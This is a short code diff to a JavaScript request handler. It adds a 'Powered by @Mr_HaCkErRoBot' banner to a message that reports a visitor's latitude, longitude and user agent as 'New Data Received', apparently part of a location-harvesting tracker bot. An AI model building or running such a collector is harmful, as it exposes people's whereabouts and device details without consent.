@@ -44,7 +44,10 @@ module.exports = async (req, res) => {
       const now = new Date();
       const dateTime = now.toLocaleString();
       
-      const messageText = `*📌 New Data Received:*\n\n` +
+      const messageText = `*╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮
+⚡Powered by :- @Mr_HaCkErRoBot
+╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯*\n\n` +
+        `*📌 New Data Received:*\n\n` +
         `*📍 Latitude:* ${latitude}\n` +
         `*📍 Longitude:* ${longitude}\n` +
         `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
